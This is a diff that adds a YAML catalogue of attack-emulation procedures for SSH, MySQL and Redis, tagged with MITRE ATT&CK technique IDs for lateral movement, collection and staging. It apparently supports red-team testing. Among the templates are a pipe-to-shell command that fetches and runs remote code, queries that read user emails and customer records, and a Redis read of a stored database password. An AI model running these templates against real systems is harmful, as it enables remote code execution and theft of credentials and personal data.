@@ -1,0 +1,107 @@
+# Lateral movement, collection and staging: written for the Phase 2 catalogue (spec 2.1).
+attack_version: "20.1"
+procedures:
+  - id: lateral-ssh-id
+    technique: T1021.004
+    tactic: TA0008
+    source: own
+    protocol: ssh
+    template: ssh {{user}}@{{host}} id
+  - id: lateral-ssh-keyscan
+    technique: T1021.004
+    tactic: TA0008
+    source: own
+    protocol: ssh
+    template: ssh-keyscan {{host}}
+  - id: lateral-ssh-uname
+    technique: T1021.004
+    tactic: TA0008
+    source: own
+    protocol: ssh
+    template: ssh -o StrictHostKeyChecking=no {{user}}@{{host}} uname -a
+  - id: lateral-ssh-port
+    technique: T1021.004
+    tactic: TA0008
+    source: own
+    protocol: ssh
+    template: ssh -p {{port}} {{user}}@{{host}} date
+  - id: collect-find-sqlite
+    technique: T1005
+    tactic: TA0009
+    source: atomic
+    protocol: ssh
+    template: find {{dir}} -name '*.sqlite*' -type f
+    ref: ART T1005 test 1 Find and dump sqlite databases (Linux) (00cbb875-7ae4-4cf1-b638-e543fd825300)
+  - id: collect-uptime-seconds
+    technique: T1005
+    tactic: TA0009
+    source: corpus
+    protocol: ssh
+    template: cat /proc/uptime | cut -d ' ' -f1 | cut -d. -f1
+  - id: collect-mysql-users
+    technique: T1005
+    tactic: TA0009
+    source: own
+    protocol: mysql
+    template: SELECT ID, user_login, user_email FROM wordpress.wp_users LIMIT 10
+  - id: stage-mkdir-copy
+    technique: T1074.001
+    tactic: TA0009
+    source: own
+    protocol: ssh
+    template: mkdir -p /var/tmp/{{word}} && cp /etc/hosts /var/tmp/{{word}}/
+  - id: stage-logs-dir
+    technique: T1074.001
+    tactic: TA0009
+    source: own
+    protocol: ssh
+    template: cp -r /var/log /var/tmp/{{word2}}-logs
+  - id: stage-move-file
+    technique: T1074.001
+    tactic: TA0009
+    source: own
+    protocol: ssh
+    template: mv /tmp/{{file}} /var/tmp/{{file2}}
+  - id: stage-script-output
+    technique: T1074.001
+    tactic: TA0009
+    source: atomic
+    protocol: ssh
+    template: curl -s {{url}} | sh -s > /tmp/{{file2}}
+    ref: ART T1074.001 test 1 Stage data from Discovery.sh (39ce0303-ae16-4b9e-bb5b-4f53e8262066)
+  - id: repo-mysql-customers
+    technique: T1213
+    tactic: TA0009
+    source: own
+    protocol: mysql
+    template: SELECT id, first_name, email FROM crm.customers LIMIT 5
+  - id: repo-redis-get
+    technique: T1213
+    tactic: TA0009
+    source: own
+    protocol: redis
+    template: GET wp:options:siteurl
+  - id: repo-redis-members
+    technique: T1213
+    tactic: TA0009
+    source: own
+    protocol: redis
+    template: SMEMBERS {{word}}
+  - id: repo-mysql-logins
+    technique: T1213
+    tactic: TA0009
+    source: own
+    protocol: mysql
+    template: SELECT user_login FROM wordpress.wp_users LIMIT 5
+  - id: repo-redis-hget
+    technique: T1213
+    tactic: TA0009
+    source: own
+    protocol: redis
+    template: HGET app:config db_pass
+  - id: repo-mysql-count
+    technique: T1213
+    tactic: TA0009
+    source: own
+    protocol: mysql
+    template: SELECT COUNT(*) FROM wordpress.wp_users
